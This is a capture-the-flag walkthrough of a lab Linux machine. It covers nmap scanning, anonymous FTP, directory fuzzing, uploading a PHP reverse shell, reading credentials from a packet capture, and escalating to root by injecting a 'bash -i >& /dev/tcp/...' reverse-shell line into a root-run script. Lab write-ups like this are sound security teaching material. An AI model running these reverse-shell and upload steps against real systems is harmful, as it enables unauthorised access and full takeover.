<hr style="border-color:red;"><h1 align="center"><img src="https://github.com/user-attachments/assets/34b117eb-364e-4662-8c46-2fbc7d5271a8"></h1>

<hr style="border-color:red;"><h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Reconnaissance & Scanning</h1><hr style="border-color:red;">

### **- Verifying the connectivity of the discovered device:**

```bash
ping -c 1 10.10.95.93
```
```bash
ping
The ping command is used to check network connectivity between your machine and another device by sending ICMP (Internet Control Message Protocol) echo request packets.
-c 1
The -c flag specifies the number of echo request packets to send. In this case, -c 1 means only one packet will be sent.
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/2811a4aa-4bad-4f57-959b-f1d14f74afb8"></picture><br>TTL = 63 ==> LINUX OS</h3><hr style="border-color:red;">

### **- Scanning of the discovered device to find all open ports to find possible access routes:**

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.95.93 -oG allPorts
```
```
-p-
This tells Nmap to scan all 65535 TCP ports (from 0 to 65535). By default, Nmap only scans the most common 1,000 ports.

--open
This filters the results to only show open ports, ignoring closed or filtered ports.

-sS
This specifies a SYN scan (also called a half-open scan or stealth scan).
Instead of fully establishing a TCP connection, Nmap sends an SYN packet and waits for a response.
If the target responds with SYN-ACK, it means the port is open.
If the target responds with RST, the port is closed.
If no response or an ICMP error is received, the port may be filtered (firewall blocking it).

--min-rate 5000
This forces Nmap to send at least 5000 packets per second, making the scan faster.
Without this, Nmap adjusts the speed automatically based on network conditions.

-vvv
This increases verbosity level (very very verbose).
It provides real-time feedback while scanning.
You will see results as they are discovered instead of waiting for the full scan to complete.

-n
This disables DNS resolution, making the scan faster.
By default, Nmap tries to resolve IPs to hostnames, which can slow down the scan.

-Pn
This tells Nmap to skip the host discovery phase and assume the target is up.
Normally, Nmap pings the target first to check if it is online.
If a firewall is blocking pings, this option is useful to force a scan even if the target doesn’t respond to pings.

-oG allPorts
This tells Nmap to output the results in "Grepable" format and save them in a file called allPorts.
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/32c1186d-216e-4f7f-abd5-a6e40e8e4e83"></picture><br>Accessible port 21,22,80 </h3>

### **- Analysis of the open ports found on the discovered device to get more information on the services running on those ports:**

```bash
nmap -sCV -p21,22,80 10.10.95.93 -oN targeted
```
```
-sC
Enables Nmap’s default script scanning.
This runs a set of default scripts to gather more information about detected services.
Scripts can detect vulnerabilities, enumerate software versions, and check for misconfigurations.
Equivalent to --script=default.

-sV
Performs version detection of services.
It tries to determine the exact software version running on open ports.

-p
This makes the scan faster and more targeted instead of scanning all ports.

-oN targeted
Saves the output in normal format to a file named targeted.
You can later review this file for findings.
```
<h3 align="center"><picture><img src="https://github.com/user-attachments/assets/d70dc79c-dee7-47ad-bbcd-7a7ace607e95"></picture><br>we have the “anonymous” user enabled so we can log in without needing a password</h3>

### **- we log in with the user “anonymous”.**
```bash
ftp 10.10.95.93
```

<h3 align="center"><picture><img src="https://github.com/user-attachments/assets/963112b2-40cb-4932-9a03-4347d7267d3b"></picture><br>We found some files</h3>

### **- downloading files.**
```bash
get important.jpg
get notice.txt
```
<h3 align="center"><picture><img src="https://github.com/user-attachments/assets/fafad368-0801-414f-9b87-3a3d83238f36"></picture><br></h3>
<h3 align="center"><picture><img src="https://github.com/user-attachments/assets/e0b850c9-7399-43d2-a39e-117d5335e06f"></picture><br></h3>
<h3 align="center"><picture><img src="https://github.com/user-attachments/assets/e72fd57a-f3b1-4e48-ab27-b3f3eab416e1"></picture><br>Nothing relevant, but maybe a possible user “MAYA”.</h3><hr style="border-color:red;">

<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 80</h2>

### **This is the web site of the victim machine running on port 80**

<h3 align="center"><picture><img src="https://github.com/user-attachments/assets/409c5e9a-77f0-4df0-91ea-e3f84f1abe94"></picture><br></h3>

### **we analyze the source code:**
```bash
CTRL+U
```
<h3 align="center"><picture><img src="https://github.com/user-attachments/assets/b7a636a5-cdde-4788-9f95-c51890266d0f"></picture><br>Nothing relevant.</h3>

<h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Vulnerability Assessment</h1><hr style="border-color:red;">

### **- - We will apply web Fuzzing to do a scan for possible hidden directories.**
```bash
gobuster dir -u http://10.10.95.93/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
```bash
gobuster dir
Uses Gobuster in directory brute-forcing mode.
It attempts to find hidden directories and files on the web server.

-u http://192.168.1.117/
Specifies the target URL (192.168.1.208).
The scan will try to discover directories and files within this web application.

-w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
Specifies the wordlist to use for directory brute-forcing.
This file (directory-list-2.3-medium.txt) contains a large list of common web directories.
Comes from SecLists, a well-known collection of security wordlists.
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/64aebef8-fbb4-4e87-a56d-b44a46153c6a"></picture><br></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/710535b9-f220-4518-9d6b-eb12df532ef5"></picture><br>In this hidden directory we can see the same files and folders that we found when entering by FTP with the user “anonymous”, which gives us to understand that this user can upload files from his account.</h3>

### **- - by scanning the directory of the user “anonymous”**

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/88647ed6-eee2-4f8e-b4ec-86c6c0772563"></picture><br>looking at the directory of the user “anonymous” we can see that the folder “ftp” has all the permissions so from there we could execute our malicious code to have access to the machine.</h3>

### **- Uploading our file**

### **- We create our file with the purpose to create a Reverse Shell with the help of a [script.](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)**

```bash
mput shell.php
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/b563e43a-f94b-4019-93f1-8e5a805f73d9"></picture><br></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/176d51cd-0625-46a6-826a-6d5c842218ee"></picture><br></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/eb769c33-8830-4f01-bd70-a3d185e89806"></picture>Our file is already inside and now we are ready to execute it but first we must put ourselves in listening mode with NC to intercept that communication.<br></h3>

```bash
nc -nlvp 443
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/47c2e507-4731-4efc-a93d-1611937786bd"></picture><br>We run our malicious file from the web and wait.</h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/5df821df-1b48-4c03-9978-2abae7b58d10"></picture><br>We are in.</h3>

### **- We apply a TTY treatment.**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 61 columns 184
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/a9df70d9-d9ae-4685-8cec-aa5644042d46"></picture><br>Now we have to investigate what we can find out in order to earn privileges.</h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/797fd5cd-8192-4d25-8cdd-e16d3453d74a"></picture><br></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/0d3fca54-1f4b-4119-a025-b89410034340"></picture><br>As we can see here we find a “.pcapng” file that when doing a google search indicates that we can check it with Wireshark, this indicates that this file is probably storing the network traffic and possible information that can be of help to us.</h3>

### **- Move the file to the FTP folder in order to download it.**

```bash
cp /incidents/suspicious.pcapng /var/www/html/files
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/1a559316-c126-4688-b5f0-6f8334e0ad94"></picture><br></h3>

### **- now with WireShark we can analyze the file**

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/c5815368-0a38-4a53-9b42-6ed68e5a6fbb"></picture><br></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/49e83764-09f6-4815-953a-3774d324556e"></picture><br>We have credentials for “lennie”.<br>c4ntg3t3n0ughsp1c3</h3>

### **- We connect via SSH with the new credentials**
```bash
ssh lennie@10.10.95.93
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/574e7b66-46fd-44aa-9d53-2812d0568d66"></picture><br></h3>

### **- Doing some research**

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/a488d338-9533-404c-85a3-03c7a45b9bca"></picture><br>Our first flag.</h3>

### **- something that strikes me is that the file “startup_list.txt” is constantly updating which makes us think that as these 3 files are doing something behind so we will modify the print.sh to see if we can make any changes.

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/52c0a12e-2cc0-4bbd-b819-8d8fa7ae07a7"></picture><br></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/145fd73a-a17a-44d8-9e13-f2de66822a73"></picture><br></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/092f65eb-cdbf-45e2-b017-c5e831195861"></picture><br></h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/d293686c-242e-4807-a9d2-77a4cb3f361f"></picture><br>As we can see it is executing what we put in the sinstructions, now we only have to modify again the print.sh file and put inside it something that gives us a shell to elevate our privileges since all this is executed as root.</h3>

```bash
nano /etc/print.sh
bash -i >& /dev/tcp/10.21.118.81/444 0>&1
```
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/fe67fb96-09ff-4ff4-aa91-be8c114874ab"></picture><br>SHELL</h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/95694f41-86e8-40f1-9454-688a4b571837"></picture><br>we wait for</h3>
<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/b9395508-8cf0-486c-8d38-86c355ecdc7e"></picture><br>We are "root"</h3>

<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/661cf5e5-7769-4da4-a053-d17b0769a702"></picture><br></h3>
